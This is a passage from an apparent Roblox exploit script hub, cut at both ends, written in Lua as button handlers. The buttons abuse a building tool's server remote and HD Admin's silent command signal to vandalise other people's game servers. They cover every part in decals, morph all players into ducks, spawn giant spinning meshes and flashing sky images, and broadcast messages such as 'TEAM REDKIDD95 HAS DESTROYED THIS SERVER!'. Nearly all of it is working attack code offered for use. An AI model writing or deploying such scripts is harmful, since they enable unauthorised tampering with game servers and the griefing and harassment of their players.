				Sky("97518021379547")
			end)
	
			--97518021379547
		end
		coroutine.wrap(DVST_fake_script)()
		local function TBGB_fake_script() -- b_16.LocalScript 
			local script = Instance.new('LocalScript', b_16)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Color(part,color)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = color --[[Color3]],
								["UnionColoring"] = false
							}
						}
					}
					_(args)
				end
				function SpawnDecal(part,side)
					local args = {
						[1] = "CreateTextures",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal"
							}
						}
					}
	
					_(args)
				end
				function AddDecal(part,asset,side)
					local args = {
						[1] = "SyncTexture",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal",
								["Texture"] = "rbxassetid://".. asset
							}
						}
					}
					_(args)
				end
	
				function spam(id)
					for i,v in game.workspace:GetDescendants() do
						if v:IsA("BasePart") then
							spawn(function()
								SetLocked(v,false)
								SpawnDecal(v,Enum.NormalId.Front)
								AddDecal(v,id,Enum.NormalId.Front)
	
								SpawnDecal(v,Enum.NormalId.Back)
								AddDecal(v,id,Enum.NormalId.Back)
	
								SpawnDecal(v,Enum.NormalId.Right)
								AddDecal(v,id,Enum.NormalId.Right)
	
								SpawnDecal(v,Enum.NormalId.Left)
								AddDecal(v,id,Enum.NormalId.Left)
	
								SpawnDecal(v,Enum.NormalId.Bottom)
								AddDecal(v,id,Enum.NormalId.Bottom)
	
								SpawnDecal(v,Enum.NormalId.Top)
								AddDecal(v,id,Enum.NormalId.Top)
							end)
						end
					end 
				end
				spam("104015451097966")
			end)
		end
		coroutine.wrap(TBGB_fake_script)()
		local function GZYV_fake_script() -- b_17.LocalScript 
			local script = Instance.new('LocalScript', b_17)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local chara = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = workspace.Part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part,
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = workspace.Part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Duckify(player)
					for i,v in player.Character:GetDescendants() do
						if v:IsA("BasePart") then
							pcall(function()
								SetLocked(v,false)
								SetTrans(v,1)
							end)
						end
					end
					char = player.Character
					--spawn(function()
					spawn(function()
						SetAnchor(true,char.HumanoidRootPart)
						CreatePart(char.HumanoidRootPart.CFrame,char)
						SetCollision(char.Part,false)
						SetName(char.Part, "Duck")
					end)
					repeat wait() until char:FindFirstChild("Duck")
					spawn(function()
						SetLocked(char.Duck,false)
						SetLocked(char.HumanoidRootPart,false)
						Weld(char.Duck,char.HumanoidRootPart,char.Duck)
						SetAnchor(false,char.Duck)
						AddMesh(char.Duck)
					end)
					repeat wait() until char.Duck:FindFirstChild("Mesh")
					MeshResize(char.Duck,Vector3.new(8,8,8))
					SetMesh(char.Duck,"10749878672")
					SetTexture(char.Duck,"10749878886")
					SetAnchor(false,char.HumanoidRootPart)
					--end)
				end
				for i,v in game.Players:GetPlayers() do
					--spawn(function()
					Duckify(v)
					--end)
				end
			end)
		end
		coroutine.wrap(GZYV_fake_script)()
		local function ZTEPKD_fake_script() -- b_18.LocalScript 
			local script = Instance.new('LocalScript', b_18)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Color(part,color)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = color --[[Color3]],
								["UnionColoring"] = false
							}
						}
					}
					_(args)
				end
				function SpawnDecal(part,side)
					local args = {
						[1] = "CreateTextures",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal"
							}
						}
					}
	
					_(args)
				end
				function AddDecal(part,asset,side)
					local args = {
						[1] = "SyncTexture",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal",
								["Texture"] = "rbxassetid://".. asset
							}
						}
					}
					_(args)
				end
	
				function spam(id)
					for i,v in game.workspace:GetDescendants() do
						if v:IsA("BasePart") then
							spawn(function()
								SetLocked(v,false)
								SpawnDecal(v,Enum.NormalId.Front)
								AddDecal(v,id,Enum.NormalId.Front)
	
								SpawnDecal(v,Enum.NormalId.Back)
								AddDecal(v,id,Enum.NormalId.Back)
	
								SpawnDecal(v,Enum.NormalId.Right)
								AddDecal(v,id,Enum.NormalId.Right)
	
								SpawnDecal(v,Enum.NormalId.Left)
								AddDecal(v,id,Enum.NormalId.Left)
	
								SpawnDecal(v,Enum.NormalId.Bottom)
								AddDecal(v,id,Enum.NormalId.Bottom)
	
								SpawnDecal(v,Enum.NormalId.Top)
								AddDecal(v,id,Enum.NormalId.Top)
							end)
						end
					end 
				end
				spam("97518021379547")
			end)
		end
		coroutine.wrap(ZTEPKD_fake_script)()
		local function UYNRJ_fake_script() -- b_19.LocalScript 
			local script = Instance.new('LocalScript', b_19)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";disco ;fogcolor white")
				wait(0.25)
	
			end)
		end
		coroutine.wrap(UYNRJ_fake_script)()
		local function XLWU_fake_script() -- b_20.LocalScript 
			local script = Instance.new('LocalScript', b_20)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";h TEAM REDKIDD95 HAS DESTROYED THIS SERVER!")
			end)
		end
		coroutine.wrap(XLWU_fake_script)()
		local function DUSSO_fake_script() -- b_21.LocalScript 
			local script = Instance.new('LocalScript', b_21)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";fly")
			end)
		end
		coroutine.wrap(DUSSO_fake_script)()
		local function LCKZXVE_fake_script() -- b_22.LocalScript 
			local script = Instance.new('LocalScript', b_22)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";btools")
			end)
		end
		coroutine.wrap(LCKZXVE_fake_script)()
		local function MXJX_fake_script() -- b_23.LocalScript 
			local script = Instance.new('LocalScript', b_23)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";titler me redkidd95Alt")
			end)
		end
		coroutine.wrap(MXJX_fake_script)()
		local function EWMNR_fake_script() -- b_24.LocalScript 
			local script = Instance.new('LocalScript', b_24)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";r6 others")
			end)
		end
		coroutine.wrap(EWMNR_fake_script)()
		local function BBYELQP_fake_script() -- b_25.LocalScript 
			local script = Instance.new('LocalScript', b_25)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";r15 all")
			end)
		end
		coroutine.wrap(BBYELQP_fake_script)()
		local function WMQVE_fake_script() -- b_26.LocalScript 
			local script = Instance.new('LocalScript', b_26)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";servermessage get rekt omg")
			end)
		end
		coroutine.wrap(WMQVE_fake_script)()
		local function LMDHP_fake_script() -- b_27.LocalScript 
			local script = Instance.new('LocalScript', b_27)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";sword all")
			end)
		end
		coroutine.wrap(LMDHP_fake_script)()
		local function SUYGLS_fake_script() -- b_28.LocalScript 
			local script = Instance.new('LocalScript', b_28)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";dog all")
			end)
		end
		coroutine.wrap(SUYGLS_fake_script)()
		local function KIOD_fake_script() -- b_29.LocalScript 
			local script = Instance.new('LocalScript', b_29)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";noclip all")
			end)
		end
		coroutine.wrap(KIOD_fake_script)()
		local function OBLAFWX_fake_script() -- b_30.LocalScript 
			local script = Instance.new('LocalScript', b_30)
	
			local Players = game:GetService("Players")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RunService = game:GetService("RunService")
	
			local player = Players.LocalPlayer
			local button = script.Parent
	
			local tool, remote
			local hrp
	
			local function WaitForSyncAPI()
				local t
				while not t do
					for _, v in ipairs(player:GetDescendants()) do
						if v.Name == "SyncAPI" then
							t = v.Parent
							break
						end
					end
					for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
						if v.Name == "SyncAPI" then
							t = v.Parent
							break
						end
					end
					task.wait(0.5)
				end
				return t
			end
	
			local function Refresh()
				tool = WaitForSyncAPI()
				remote = tool.SyncAPI.ServerEndpoint
			end
	
			player.CharacterAdded:Connect(function(char)
				hrp = char:WaitForChild("HumanoidRootPart")
				task.wait(0.5)
				Refresh()
			end)
	
			if player.Character then
				hrp = player.Character:WaitForChild("HumanoidRootPart")
				Refresh()
			end
	
			local function _(args)
				if not remote then return end
				pcall(function()
					remote:InvokeServer(unpack(args))
				end)
			end
	
			local function CreatePart(cf)
				_({"CreatePart", "Normal", cf, workspace})
			end
	
			local function Anchor(p)
				_({"SyncAnchor", {{Part = p, Anchored = true}}})
			end
	
			local function AddMesh(p)
				_({"CreateMeshes", {{Part = p}}})
			end
	
			local function SetMesh(p, id)
				_({"SyncMesh", {{Part = p, MeshId = "rbxassetid://"..id}}})
			end
	
			local function SetTexture(p, id)
				_({"SyncMesh", {{Part = p, TextureId = "rbxassetid://"..id}}})
			end
	
			local function ResizeMesh(p, s)
				_({"SyncMesh", {{Part = p, Scale = s}}})
			end
	
			button.MouseButton1Click:Connect(function()
				if not hrp then return end
	
				local baseCF = CFrame.new(hrp.Position + Vector3.new(0,6,0))
				CreatePart(baseCF)
				task.wait(0.4)
	
				local part
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") and (v.Position - baseCF.Position).Magnitude < 0.2 then
						part = v
						break
					end
				end
				if not part then return end
				Anchor(part)
				AddMesh(part)
				SetMesh(part, "111891702759441")
				SetTexture(part, "104015451097966")
				ResizeMesh(part, Vector3.new(3000,3000,3000))
	
				local rot = Vector3.new(0,0,0)
	
				local speedX = 50
				local speedY = 50
				local speedZ = 50
	
				RunService.Heartbeat:Connect(function(dt)
					if not part then return end
	
					rot = Vector3.new(
						(rot.X + speedX * dt) % 360,
						(rot.Y + speedY * dt) % 360,
						(rot.Z + speedZ * dt) % 360
					)
	
					local cf =
						baseCF *
						CFrame.Angles(
							math.rad(rot.X),
							math.rad(rot.Y),
							math.rad(rot.Z)
						)
	
					_({"SyncMove", {{Part = part, CFrame = cf}}})
				end)
			end)
		end
		coroutine.wrap(OBLAFWX_fake_script)()
		local function ZFVQHZ_fake_script() -- b_31.LocalScript 
			local script = Instance.new('LocalScript', b_31)
	
			script.Parent.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local RunService = game:GetService("RunService")
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function CreatePart(cf, parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
	
				function SetAnchor(part, boolean)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
	
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part, meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://" .. meshid
							}
						}
					}
					_(args)
				end
	
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = texid
							}
						}
					}
					_(args)
				end
	
				function MeshResize(part, size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
	
				function SetTransparency(part, value)
					local args = {
						[1] = "SyncTransparency",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = value
							}
						}
					}
					_(args)
				end
	
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
	
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
	
				local images = {
					"http://www.roblox.com/asset/?id=80284567792891",
					"http://www.roblox.com/asset/?id=128175753315310",
					"http://www.roblox.com/asset/?id=108358121529123",
					"http://www.roblox.com/asset/?id=126489332710448",
					"http://www.roblox.com/asset/?id=117570936956487",
					"http://www.roblox.com/asset/?id=122661378990512",
					"http://www.roblox.com/asset/?id=139577836503158",
					"http://www.roblox.com/asset/?id=91913326413267",
					"http://www.roblox.com/asset/?id=73660049182081",
					"http://www.roblox.com/asset/?id=123376302324197",
					"http://www.roblox.com/asset/?id=99976919757191"
				}
	
				local skyPart
				local skyLoop
				local frameTime = 2 / 10
				local lastUpdate = 0
	
				function CreateSky()
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					local cf = hrp.CFrame
					CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
							skyPart = v
							SetAnchor(skyPart, true)
							AddMesh(skyPart)
							SetMesh(skyPart, "111891702759441")
							MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
							SetTransparency(skyPart, 1)
							SetName(v,"Sky")
	
							local index = 1
							skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
								lastUpdate = lastUpdate + deltaTime
								if lastUpdate >= frameTime then
									lastUpdate = 0
									if not skyPart then
										print("fuck ittt")
										return
									end
									SetTransparency(skyPart, 0)
									SetTexture(skyPart, images[index])
									index = index % #images + 1
								end
							end)
						end
					end
				end
	
				function ResetSky()
					if skyPart then
						DestroyPart(skyPart)
						skyPart = nil
					end
					if skyLoop then
						skyLoop:Disconnect()
						skyLoop = nil
					end
					CreateSky()
				end
	
				player.CharacterAdded:Connect(function(newChar)
					char = newChar
					ResetSky()
				end)
	
				if char and char:FindFirstChild("Humanoid") then
					char:WaitForChild("Humanoid").Died:Connect(function()
						ResetSky()
					end)
				end
	
				CreateSky()
			end)
		end
		coroutine.wrap(ZFVQHZ_fake_script)()
		local function SMIX_fake_script() -- b_32.LocalScript 
			local script = Instance.new('LocalScript', b_32)
	
			script.Parent.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local RunService = game:GetService("RunService")
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function CreatePart(cf, parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
	
				function SetAnchor(part, boolean)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
	
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part, meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://" .. meshid
							}
						}
					}
					_(args)
				end
	
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = texid
							}
						}
					}
					_(args)
				end
	
				function MeshResize(part, size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
	
				function SetTransparency(part, value)
					local args = {
						[1] = "SyncTransparency",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = value
							}
						}
					}
					_(args)
				end
	
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
	
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
	
				local images = {
					"rbxassetid://121307077299366", --1
					"rbxassetid://91382383089634", --2
					"rbxassetid://73188922546657", --3
					"rbxassetid://89217992797022", --4
					"rbxassetid://77929289056373", --5
					"rbxassetid://127271771565371", --6
					"rbxassetid://78634186908315", --7
					"rbxassetid://94416686075730", --8
					"rbxassetid://98034740736063", --9
					"rbxassetid://79199428122860", --10
					"rbxassetid://124205531516252", --11
					"rbxassetid://89541686591267", --12
					"rbxassetid://121812322375747", --13
					"rbxassetid://107035915702045",-- 14
					"rbxassetid://121021080673938",--15
					"rbxassetid://94928775380844",--16
					"rbxassetid://133789954883077",--17
					"rbxassetid://74664840673083",--18
					"rbxassetid://98456061103883",--19
					"rbxassetid://106502103392081"--20
				}
	
				local skyPart
				local skyLoop
				local frameTime = 2 / 20
				local lastUpdate = 0
	
				function CreateSky()
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					local cf = hrp.CFrame
					CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
							skyPart = v
							SetAnchor(skyPart, true)
							AddMesh(skyPart)
							SetMesh(skyPart, "111891702759441")
							MeshResize(skyPart, Vector3.new(4000, 4000, 4000))
							SetTransparency(skyPart, 1)
							SetName(v,"Sky")
	
							local index = 1
							skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
								lastUpdate = lastUpdate + deltaTime
								if lastUpdate >= frameTime then
									lastUpdate = 0
									if not skyPart then
										print("fuck ittt")
										return
									end
									SetTransparency(skyPart, 0)
									SetTexture(skyPart, images[index])
									index = index % #images + 1
								end
							end)
						end
					end
				end
	
				function ResetSky()
					if skyPart then
						DestroyPart(skyPart)
						skyPart = nil
					end
					if skyLoop then
						skyLoop:Disconnect()
						skyLoop = nil
					end
					CreateSky()
				end
	
				player.CharacterAdded:Connect(function(newChar)
					char = newChar
